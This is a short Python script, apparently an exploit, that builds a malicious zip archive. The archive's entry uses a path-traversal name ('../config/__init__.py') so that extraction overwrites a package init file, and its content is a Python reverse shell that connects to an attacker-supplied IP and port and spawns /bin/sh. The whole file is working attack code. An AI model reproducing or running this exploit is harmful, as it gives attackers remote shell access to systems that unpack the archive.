import zipfile
import requests
import sys
from io import BytesIO


z_info = zipfile.ZipInfo(r"../config/__init__.py")
z_info.external_attr = 0o777 << 16
z_file = zipfile.ZipFile("bad.zip", mode="w")
ip = sys.argv[1]
port = sys.argv[2]
z_file.writestr(
    z_info,
    f"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')",
)

z_file.close()
